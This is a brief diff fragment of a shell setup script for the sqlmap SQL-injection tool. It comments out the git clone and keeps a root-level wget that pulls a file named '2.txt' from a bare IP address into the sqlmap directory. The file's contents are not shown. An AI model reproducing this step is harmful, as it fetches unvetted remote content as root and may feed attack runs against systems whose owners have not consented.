@@ -3,7 +3,7 @@ apt update
 if [ -f "$dir" ] ; then
   echo "ok"
 else
-  git clone https://github.com/sqlmapproject/sqlmap.git
+  #git clone https://github.com/sqlmapproject/sqlmap.git
   wget http://20.24.186.53:7788/2.txt -O /root/sqlmap/2.txt
 fi
 
